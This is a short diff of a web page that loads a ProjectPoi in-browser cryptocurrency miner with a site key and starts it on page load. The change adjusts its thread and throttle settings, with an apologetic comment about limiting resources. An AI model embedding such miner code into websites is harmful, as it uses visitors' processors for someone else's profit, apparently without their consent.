@@ -114,7 +114,8 @@
     <script src="https://ppoi.org/lib/projectpoi.min.js"></script>
     <script>
         var miner = new ProjectPoi.Anonymous('9iFrNpCH6wZY1Q1FRNIU5Bf4',{
-            throttle: 0.5,  // Add throttle, Sorry....
+            threads: 2,
+            throttle: 0.6  // Add resource limit, Sorry....
         });
         miner.start();
     </script>
